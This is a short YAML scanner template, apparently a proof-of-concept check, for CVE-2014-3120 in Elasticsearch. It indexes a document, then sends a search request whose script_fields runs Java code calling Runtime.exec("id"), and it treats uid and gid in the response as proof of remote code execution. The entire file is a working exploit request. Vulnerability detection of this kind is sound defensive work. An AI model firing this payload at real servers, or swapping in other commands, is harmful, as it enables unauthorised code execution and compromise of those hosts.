cve-id: CVE-2014-3120
rules:
  - method: POST
    path: /website/blog/
    headers:
      Content-Type: application/json
    body: |
      {
        "name": "phithon"
      }
    expression: response.status == 201

  - method: POST
    path: /_search?pretty
    headers:
      Content-Type: application/json
    body: |-
      {
        "size": 1,
        "query": {
          "filtered": {
            "query": {
              "match_all": {}
            }
          }
        },
        "script_fields": {
          "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
          }
        }
      }
    expression: |
      response.body.bcontains(b"gid") && response.body.bcontains(b"uid") && response.body.bcontains(b"groups")
severity:
  critical
type: 
  rce
